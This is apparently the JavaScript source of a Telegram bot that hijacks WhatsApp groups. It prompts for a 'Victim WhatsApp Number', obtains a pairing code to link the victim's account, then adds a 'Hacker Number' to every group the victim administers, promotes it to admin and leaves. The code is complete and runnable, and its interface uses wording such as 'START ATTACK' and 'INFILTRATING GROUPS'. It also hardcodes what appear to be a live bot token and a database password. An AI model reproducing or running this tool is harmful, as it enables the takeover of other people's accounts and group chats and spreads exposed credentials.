// =================================================================
// ⚡ DX-SYSTEM ULTRA v10.0 (HYPER MAX - STABLE & PERFECT ALGO)
// 👨‍💻 Developed by: DX-CODEX (2026 Latest Architecture)
// =================================================================

import TelegramBot from 'node-telegram-bot-api';
import mongoose from 'mongoose';
import express from 'express';
import { 
    makeWASocket, 
    useMultiFileAuthState, 
    DisconnectReason, 
    delay, 
    fetchLatestBaileysVersion, 
    jidNormalizedUser, 
    makeCacheableSignalKeyStore
} from '@whiskeysockets/baileys'; // 🟢 FIXED: Using updated whisper library
import pino from 'pino';
import fs from 'fs-extra'; 
import pn from 'awesome-phonenumber'; 

// --- [ ⚙️ CONFIGURATION ] ---
const CONFIG = {
    BOT_TOKEN: "8815061873:AAHz742vVWcT-De1akhFGbhRKevMYKvXeUw", 
    MONGO_URL: "mongodb+srv://dxsimu:mnbvcxzdx@dxsimu.0qrxmsr.mongodb.net/?appName=dxsimu", 
    OWNER_IDS: [6703335929, 5136260272, 7957605290], 
};

// --- [ 🎨 DX FONT STYLER ] ---
const toDxFont = (text) => {
    const map = {
        'a': 'ᴀ', 'b': 'ʙ', 'c': 'ᴄ', 'd': 'ᴅ', 'e': 'ᴇ', 'f': 'ғ', 'g': 'ɢ', 'h': 'ʜ', 'i': 'ɪ',
        'j': 'ᴊ', 'k': 'ᴋ', 'l': 'ʟ', 'm': 'ᴍ', 'n': 'ɴ', 'o': 'ᴏ', 'p': 'ᴘ', 'q': 'ǫ', 'r': 'ʀ',
        's': 's', 't': 'ᴛ', 'u': 'ᴜ', 'v': 'ᴠ', 'w': 'ᴡ', 'x': 'x', 'y': 'ʏ', 'z': 'ᴢ',
        'A': 'ᴀ', 'B': 'ʙ', 'C': 'ᴄ', 'D': 'ᴅ', 'E': 'ᴇ', 'F': 'ғ', 'G': 'ɢ', 'H': 'ʜ', 'I': 'ɪ',
        'J': 'ᴊ', 'K': 'ᴋ', 'L': 'ʟ', 'M': 'ᴍ', 'N': 'ɴ', 'O': 'ᴏ', 'P': 'ᴘ', 'Q': 'ǫ', 'R': 'ʀ',
        'S': 's', 'T': 'ᴛ', 'U': 's', 'V': 'ᴠ', 'W': 'ᴡ', 'X': 'x', 'Y': 'ʏ', 'Z': 'ᴢ'
    };
    return text.split('').map(c => map[c] || c).join('');
};

const ui = {
    header: (title) => `<b>⚡ ${toDxFont(title)}</b>\n━━━━━━━━━━━━━━━━━━━━`,
    error: (text) => `<b>💀 ᴇʀʀᴏʀ:</b> ${text}`,
    success: (text) => `<b>💎 sᴜᴄᴄᴇss:</b> ${text}`,
};

// --- [ 🗄️ DATABASE CONNECTION ] ---
mongoose.connect(CONFIG.MONGO_URL)
    .then(() => console.log('✅ MongoDB Connected (DX-NET)'))
    .catch(err => console.error('❌ MongoDB Error:', err));

const userSchema = new mongoose.Schema({
    userId: { type: Number, unique: true }, 
    firstName: String,
    username: String,
    isBanned: { type: Boolean, default: false },
    waConnected: { type: Boolean, default: false },
    sudoNumber: { type: String, default: null },
    joinedDate: { type: Date, default: Date.now }
});
const User = mongoose.model('User', userSchema);

// --- [ 🌐 SERVER KEEP-ALIVE ] ---
const app = express();
app.get('/', (req, res) => res.send('<b>⚡ DX-SYSTEM v10.0 ULTRA RUNNING... STATUS: ALIVE</b>'));

const PORT = process.env.PORT || 3000;
app.listen(PORT, () => console.log(`🖥️ Server Online on Port: ${PORT}`));

// --- [ 🤖 BOT INIT & STATE MAPS ] ---
const bot = new TelegramBot(CONFIG.BOT_TOKEN, { polling: true });
const userStates = new Map();
const userDataCache = new Map();
const activeSessions = new Map();
const pairingTimers = new Map(); // 🟢 NEW: Store 60s timers for strict cancellation

// --- [ 🛡️ HELPERS: FORCE CLEAN & CANCEL ] ---
async function isBanned(userId) {
    const user = await User.findOne({ userId });
    return user?.isBanned || false;
}

async function cleanSession(tgUserId, forceLogout = false) {
    const sessionPath = `./sessions/session_${tgUserId}`;
    
    // Clear pairing timeouts properly
    if (pairingTimers.has(tgUserId)) {
        clearTimeout(pairingTimers.get(tgUserId));
        pairingTimers.delete(tgUserId);
    }

    // Kill Socket completely & LOGOUT IF BANNED
    if (activeSessions.has(tgUserId)) {
        try {
            const sock = activeSessions.get(tgUserId);
            if (forceLogout) {
                await sock.logout('User banned by DX-Admin'); // 🟢 Logout from WhatsApp Servers
            }
            sock.ev.removeAllListeners(); 
            sock.end(undefined);
            sock.ws.close();
        } catch (e) { }
        activeSessions.delete(tgUserId);
    }

    // Wipe Folder
    if (fs.existsSync(sessionPath)) {
        await fs.remove(sessionPath);
    }

    // Clear States
    userStates.delete(tgUserId);
    userDataCache.delete(tgUserId);
    await User.updateOne({ userId: tgUserId }, { waConnected: false });
}

// --- [ 🟢 WHATSAPP CORE & SINGLE-TRY PAIRING SYSTEM ] ---
async function startWhatsAppSession(tgUserId, loginPhone, sudoPhone) {
    await cleanSession(tgUserId); // Fresh start
    
    const sessionPath = `./sessions/session_${tgUserId}`;
    const pNumber = pn('+' + loginPhone.replace(/[^0-9]/g, ''));
    
    if (!pNumber.isValid()) {
        return bot.sendMessage(tgUserId, ui.error("Invalid Number Format!"), { parse_mode: 'HTML' });
    }
    const cleanPhone = pNumber.getNumber('e164').replace('+', '');

    const { state, saveCreds } = await useMultiFileAuthState(sessionPath);
    const { version } = await fetchLatestBaileysVersion();

    const sock = makeWASocket({
        version,
        logger: pino({ level: 'silent' }), 
        printQRInTerminal: false,
        auth: {
            creds: state.creds,
            keys: makeCacheableSignalKeyStore(state.keys, pino({ level: "silent" })),
        },
        browser: ['Ubuntu', 'Chrome', '20.0.04'], 
        markOnlineOnConnect: false,
        syncFullHistory: false, 
        generateHighQualityLinkPreview: false,
        connectTimeoutMs: 60000,
        keepAliveIntervalMs: 15000,
        retryRequestDelayMs: 2500
    });

    activeSessions.set(tgUserId, sock);

    // 🚀 NEW 60-SECOND SINGLE TRY ALGORITHM
    if (!sock.authState.creds.registered) {
        try {
            // Give socket 3 seconds to spin up before request
            await delay(3000); 
            
            let code = await sock.requestPairingCode(cleanPhone);
            let finalCode = code?.match(/.{1,4}/g)?.join('-') || code;
            
            const msg = `${ui.header('⚡ ᴘᴀɪʀɪɴɢ ᴄᴏᴅᴇ')}\n` +
                        `📱 ɴᴜᴍʙᴇʀ: <code>${cleanPhone}</code>\n` +
                        `🔑 ᴄᴏᴅᴇ: <code>${finalCode}</code>\n\n` +
                        `<i>⚠️ You have 60 seconds to login.</i>`;
                        
            bot.sendMessage(tgUserId, msg, { 
                parse_mode: 'HTML',
                reply_markup: { inline_keyboard: [[{ text: "🛑 CANCEL", callback_data: 'stop_process' }]] }
            }).catch(()=>{});

            // 🟢 STRICT 60 SECOND CANCEL LOOP
            const timer = setTimeout(async () => {
                if (activeSessions.has(tgUserId)) {
                    const checkSock = activeSessions.get(tgUserId);
                    if (!checkSock.authState.creds.registered) {
                        bot.sendMessage(tgUserId, ui.error("⏳ <b>Unsuccessful:</b> 60 seconds passed. Pairing request cancelled to prevent loops."), { parse_mode: 'HTML' }).catch(()=>{});
                        await cleanSession(tgUserId); // Cancel safely
                    }
                }
            }, 60000);
            
            pairingTimers.set(tgUserId, timer);

        } catch (err) {
            bot.sendMessage(tgUserId, ui.error(`Pairing Failed: ${err.message}`), { parse_mode: 'HTML' }).catch(()=>{});
            await cleanSession(tgUserId);
        }
    }

    sock.ev.on('creds.update', saveCreds);

    sock.ev.on('connection.update', async (update) => {
        const { connection, lastDisconnect } = update;

        if (connection === 'close') {
            const statusCode = (lastDisconnect.error)?.output?.statusCode;
            
            if (statusCode === DisconnectReason.loggedOut) {
                await cleanSession(tgUserId);
                bot.sendMessage(tgUserId, ui.error("🚫 Logged Out from WhatsApp. Session wiped."), { parse_mode: 'HTML' }).catch(()=>{});
            } 
            else if (statusCode === DisconnectReason.restartRequired) {
                // Ignore if we are still waiting for pairing (prevents loop)
                if (sock.authState.creds.registered) {
                    startWhatsAppSession(tgUserId, loginPhone, sudoPhone); 
                }
            }
        } 
        else if (connection === 'open') {
            // Stop the 60s timer because we successfully paired!
            if (pairingTimers.has(tgUserId)) {
                clearTimeout(pairingTimers.get(tgUserId));
                pairingTimers.delete(tgUserId);
            }
            
            bot.sendMessage(tgUserId, ui.success(`<b>Pairing Successful!</b>\nStarting Hyper Infiltration...`), { parse_mode: 'HTML' }).catch(()=>{});
            await User.updateOne({ userId: tgUserId }, { waConnected: true });
            
            // Launch Algo
            await runAdvancedAlgorithm(sock, tgUserId, sudoPhone);
        }
    });
}

// --- [ 🚀 HYPER ALGORITHM: SMART FILTER -> ADD -> PROMOTE -> LEAVE ] ---
async function runAdvancedAlgorithm(sock, tgUserId, targetNumber) {
    try {
        const formattedSudo = targetNumber.replace(/[^0-9]/g, '') + "@s.whatsapp.net";
        const botId = jidNormalizedUser(sock.user.id);

        let statusMsg = await bot.sendMessage(tgUserId, `🔍 <b>${toDxFont("SCANNING GROUPS...")}</b>`, { 
            parse_mode: 'HTML',
            reply_markup: { inline_keyboard: [[{ text: "🛑 FORCE STOP", callback_data: 'stop_process' }]] }
        }).catch(()=>{});

        const groups = await sock.groupFetchAllParticipating();
        
        let validGroups = [];
        for (const jid in groups) {
            const meta = groups[jid];
            const botIsAdmin = meta.participants.some(p => jidNormalizedUser(p.id) === botId && p.admin);
            if (botIsAdmin && !meta.announce) validGroups.push(jid);
        }

        if (validGroups.length === 0) {
            if(statusMsg) return bot.editMessageText(ui.error("No groups found where Bot is Admin. Aborting."), { chat_id: tgUserId, message_id: statusMsg.message_id, parse_mode: 'HTML' }).catch(()=>{});
            return;
        }

        let stats = { success: 0, left: 0, fail: 0 };
        let count = 0;
        const total = validGroups.length;

        for (const jid of validGroups) {
            if (!activeSessions.has(tgUserId)) break; 

            count++;
            let progress = Math.floor((count / total) * 10);
            let bar = '▓'.repeat(progress) + '░'.repeat(10 - progress);
            
            if(statusMsg && (count % 2 === 0 || count === total)) {
                bot.editMessageText(`⚙️ <b>${toDxFont("INFILTRATING GROUPS")}</b>\n[${bar}] ${Math.floor((count / total) * 100)}%\n\n<i>Target: ${count}/${total}</i>`, { 
                    chat_id: tgUserId, 
                    message_id: statusMsg.message_id, 
                    parse_mode: 'HTML',
                    reply_markup: { inline_keyboard: [[{ text: "🛑 FORCE STOP", callback_data: 'stop_process' }]] }
                }).catch(()=>{});
            }

            try {
                // 1. ADD Sudo User
                try {
                    await sock.groupParticipantsUpdate(jid, [formattedSudo], "add");
                    await delay(1200); 
                } catch (err) {} 

                // 2. PROMOTE Sudo User
                try {
                    const freshMeta = await sock.groupMetadata(jid);
                    const sudoUser = freshMeta.participants.find(p => jidNormalizedUser(p.id) === formattedSudo);
                    
                    if (sudoUser && !sudoUser.admin) {
                        await sock.groupParticipantsUpdate(jid, [formattedSudo], "promote");
                        stats.success++;
                        await delay(1200);
                    } else if (sudoUser?.admin) {
                        stats.success++; 
                    }
                } catch(err) {}

                // 3. LEAVE Group
                await sock.groupLeave(jid);
                stats.left++;
                await delay(1500); 

            } catch (e) {
                stats.fail++;
            }
        }

        if(activeSessions.has(tgUserId)) {
            const report = ui.header('⚡ ᴏᴘᴇʀᴀᴛɪᴏɴ sᴜᴄᴄᴇssғᴜʟ') + 
                           `\n👑 <b>Admin Given:</b> ${stats.success}` +
                           `\n👋 <b>Bot Escaped:</b> ${stats.left}` +
                           `\n🛡️ <b>Failed:</b> ${stats.fail}` +
                           `\n\n<i>🔥 Operation 100% Executed.</i>`;
            
            bot.sendMessage(tgUserId, report, { parse_mode: 'HTML' }).catch(()=>{});
            await cleanSession(tgUserId); 
        }

    } catch (e) {
        bot.sendMessage(tgUserId, ui.error("Operation Error: " + e.message), { parse_mode: 'HTML' }).catch(()=>{});
        await cleanSession(tgUserId);
    }
}

// --- [ 🎮 TELEGRAM COMMANDS & UI ] ---

bot.onText(/\/(start|menu)/, async (msg) => {
    const chatId = msg.chat.id;
    if (await isBanned(chatId)) return bot.sendMessage(chatId, ui.error("🚫 <b>BANNED</b>"), { parse_mode: 'HTML' }).catch(()=>{});

    await cleanSession(chatId);
    
    await User.updateOne({ userId: chatId }, { 
        firstName: msg.from.first_name, 
        username: msg.from.username 
    }, { upsert: true });

    const welcomeMsg = ui.header('ɴɪᴋᴏ sʏsᴛᴇᴍ ᴠ₁₀.₀') +
        `\n👋 <b>Hᴇʟʟᴏ ${msg.from.first_name}</b>\n` +
        `\n🚀 <b>Sᴛᴀᴛᴜs:</b> <code>ULTRA PRO</code>` +
        `\n\n${toDxFont("Press button to start process.")}`;

    bot.sendMessage(chatId, welcomeMsg, {
        reply_markup: {
            inline_keyboard: [
                [{ text: "⚡ START ATTACK", callback_data: 'login' }],
                [{ text: "🛑 STOP CURRENT PROCESS", callback_data: 'stop_process' }]
            ]
        },
        parse_mode: 'HTML'
    }).catch(()=>{});
});

bot.onText(/\/stop/, async (msg) => {
    const chatId = msg.chat.id;
    await cleanSession(chatId);
    bot.sendMessage(chatId, ui.success("System Stopped & Session Wiped."), { parse_mode: 'HTML' }).catch(()=>{});
});

bot.on('callback_query', async (query) => {
    const chatId = query.message.chat.id;
    if (await isBanned(chatId)) return;

    if (query.data === 'login') {
        await cleanSession(chatId); 
        userStates.set(chatId, 'WAITING_LOGIN');
        bot.sendMessage(chatId, `📱 <b>Enter Victim WhatsApp Number:</b>\nEx: <code>919876543210</code>`, { 
            parse_mode: 'HTML',
            reply_markup: { inline_keyboard: [[{ text: "🛑 CANCEL", callback_data: 'stop_process' }]] }
        }).catch(()=>{});
    }
    
    if (query.data === 'stop_process') {
        await cleanSession(chatId);
        bot.sendMessage(chatId, ui.success("🛑 Process Terminated! Session cleaned safely."), { parse_mode: 'HTML' }).catch(()=>{});
    }
});

bot.on('message', async (msg) => {
    const chatId = msg.chat.id;
    const text = msg.text;
    if (!text || text.startsWith('/') || await isBanned(chatId)) return;

    const state = userStates.get(chatId);

    if (state === 'WAITING_LOGIN') {
        if (text.length < 7) return bot.sendMessage(chatId, ui.error("Invalid Number."), { parse_mode: 'HTML' }).catch(()=>{});
        
        userDataCache.set(chatId, { login: text });
        userStates.set(chatId, 'WAITING_SUDO');
        
        bot.sendMessage(chatId, `👑 <b>Enter Hacker Number:</b>\n<i>(Who gets Admin)</i>\nEx: <code>919876543210</code>`, { 
            parse_mode: 'HTML',
            reply_markup: { inline_keyboard: [[{ text: "🛑 CANCEL", callback_data: 'stop_process' }]] }
        }).catch(()=>{});
    }
    else if (state === 'WAITING_SUDO') {
        const data = userDataCache.get(chatId);
        userStates.delete(chatId); 
        
        await User.updateOne({ userId: chatId }, { sudoNumber: text });
        
        bot.sendMessage(chatId, `⚙️ ${toDxFont("INJECTING SCRIPT...")}\nPlease wait.`, { parse_mode: 'HTML' }).catch(()=>{});
        startWhatsAppSession(chatId, data.login, text);
    }
});

// --- [ 👮 ADMIN COMMANDS ] ---
bot.onText(/\/users/, async (msg) => {
    const chatId = msg.chat.id;
    if (!CONFIG.OWNER_IDS.includes(chatId)) return;

    const allUsers = await User.find({});
    let txt = "--- DX-SYSTEM DB ---\n";
    allUsers.forEach(u => txt += `${u.userId} | ${u.sudoNumber || 'NONE'} | ${u.firstName}\n`);

    bot.sendDocument(chatId, Buffer.from(txt, 'utf-8'), {}, { filename: 'users.txt', contentType: 'text/plain' }).catch(()=>{});
});

// 🟢 NEW: Auto-Logout all devices when BANNED
bot.onText(/\/ban (.+)/, async (msg, match) => {
    if (!CONFIG.OWNER_IDS.includes(msg.chat.id)) return;
    const tgUserId = Number(match[1]);
    
    const user = await User.findOneAndUpdate({ userId: tgUserId }, { isBanned: true });
    if (user) {
        // 'true' as the second parameter forces WhatsApp backend logout
        await cleanSession(tgUserId, true); 
        bot.sendMessage(msg.chat.id, ui.success(`User <b>${tgUserId}</b> has been BANNED.\nAll active WhatsApp sessions have been forcefully LOGGED OUT.`)).catch(()=>{});
    } else {
        bot.sendMessage(msg.chat.id, ui.error(`User not found in DB.`)).catch(()=>{});
    }
});

bot.onText(/\/unban (.+)/, async (msg, match) => {
    if (!CONFIG.OWNER_IDS.includes(msg.chat.id)) return;
    await User.updateOne({ userId: match[1] }, { isBanned: false });
    bot.sendMessage(msg.chat.id, ui.success(`User UNBANNED`)).catch(()=>{});
});

process.on('uncaughtException', (e) => console.log('⚠️ Fatal:', e.message));
process.on('unhandledRejection', (e) => console.log('⚠️ Reject:', e.message));
